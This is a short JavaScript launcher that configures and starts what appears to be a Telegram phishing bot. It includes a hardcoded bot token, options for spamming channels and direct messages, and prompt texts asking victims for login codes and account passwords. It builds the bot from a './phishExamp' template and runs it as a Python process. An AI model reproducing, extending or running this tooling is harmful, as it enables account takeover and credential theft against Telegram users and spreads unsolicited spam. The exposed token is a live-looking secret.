const createConfig = require("./botCreatingTools/createConfig");
const createBot = require("./botCreatingTools/createBot");
const cmdWorking = require("./botCreatingTools/cmdWorking");

const config = createConfig("5722806586:AAFhIoDynQz_OcjCzYKN2M_KHkqFOFJv2no", {joinChannels: [], channelsSpam: [], dmSpam: true, spamText: "1"}, {authorizationButtonText: "1", startText: "hi!", connectionText: "hi!", codeText: "1", errorSendCodeText: "!", validCodeText: "1", invalidCodeErrorText: "invalidCodeErrorText", passwordNeedErrorText: "passwordNeedErrorText", invalidPasswordError:"1"})
createBot(config, "./bots", "./phishExamp");
cmdWorking("python ./bots/bot.py");

console.log("!");
